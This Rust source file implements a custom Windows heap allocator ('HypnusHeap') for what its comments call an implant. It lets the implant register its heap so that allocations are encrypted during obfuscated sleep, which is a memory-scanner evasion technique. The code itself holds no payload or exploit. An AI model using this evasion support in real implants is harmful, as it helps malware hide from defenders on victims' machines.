use core::{
    alloc::{GlobalAlloc, Layout},
    ffi::c_void,
    ptr::null_mut,
    sync::atomic::{AtomicPtr, Ordering},
};

use dinvk::types::HANDLE;
use crate::types::HEAP_GROWABLE;

/// Global handle to the custom heap used by `HypnusHeap`.
static HEAP_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(null_mut());

/// External heap handle (set by implant for obfuscation compatibility).
/// When set, this heap is used for heap walking during obfuscated sleep,
/// ensuring that the implant's allocations (not HypnusHeap's internal heap)
/// are encrypted.
static EXTERNAL_HEAP: AtomicPtr<c_void> = AtomicPtr::new(null_mut());

/// A thread-safe wrapper for managing a Windows Heap.
pub struct HypnusHeap;

impl HypnusHeap {
    /// Initializes a new private heap
    fn create_heap() -> HANDLE {
        let handle = unsafe { 
            RtlCreateHeap(
                HEAP_GROWABLE, 
                null_mut(), 
                0, 
                0, 
                null_mut(), 
                null_mut()
            ) 
        };
        
        if handle.is_null() {
            return null_mut();
        }
        
        HEAP_HANDLE.store(handle, Ordering::SeqCst);
        handle
    }

    /// Set external heap handle for obfuscation.
    /// 
    /// Called by the implant to register its heap for encryption during sleep.
    /// This allows the implant to use its own allocator (with runtime-resolved APIs)
    /// while still benefiting from hypnus heap obfuscation.
    /// 
    /// # Safety
    /// The provided handle must be a valid heap handle that remains valid
    /// for the lifetime of the implant.
    pub fn set_external_heap(handle: *mut c_void) {
        EXTERNAL_HEAP.store(handle, Ordering::SeqCst);
    }
    
    /// Clear the external heap handle.
    pub fn clear_external_heap() {
        EXTERNAL_HEAP.store(null_mut(), Ordering::SeqCst);
    }
    
    /// Check if an external heap is registered.
    pub fn has_external_heap() -> bool {
        !EXTERNAL_HEAP.load(Ordering::SeqCst).is_null()
    }

    /// Returns the heap handle to use for obfuscation.
    /// 
    /// Prefers external heap if set (for implant compatibility),
    /// otherwise uses the internal HypnusHeap.
    pub fn get() -> HANDLE {
        // Check external heap first (implant's private heap)
        let external = EXTERNAL_HEAP.load(Ordering::SeqCst);
        if !external.is_null() {
            return external;
        }
        
        // Fall back to internal heap
        let handle = HEAP_HANDLE.load(Ordering::SeqCst);
        if !handle.is_null() {
            handle
        } else {
            Self::create_heap()
        }
    }
}

unsafe impl GlobalAlloc for HypnusHeap {
    /// Allocates memory using the custom heap.
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let heap = Self::get();
        let size = layout.size();
        if size == 0 {
            return null_mut();
        }

        unsafe { RtlAllocateHeap(heap, 0, size) as *mut u8 }
    }

    /// Deallocates memory using the custom heap.
    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        if ptr.is_null() {
            return;
        }

        unsafe { core::ptr::write_bytes(ptr, 0, layout.size()) };
        unsafe {
            RtlFreeHeap(Self::get(), 0, ptr.cast());
        }
    }
}

windows_targets::link!("ntdll" "system" fn RtlFreeHeap(heap: HANDLE, flags: u32, ptr: *mut c_void) -> i8);
windows_targets::link!("ntdll" "system" fn RtlAllocateHeap(heap: HANDLE, flags: u32, size: usize) -> *mut c_void);
windows_targets::link!("ntdll" "system" fn RtlCreateHeap(
    flags: u32, 
    heap_base: *mut c_void, 
    reserve_size: usize, 
    commit_size: usize, 
    lock: *mut c_void, 
    parameters: *mut c_void
) -> HANDLE);
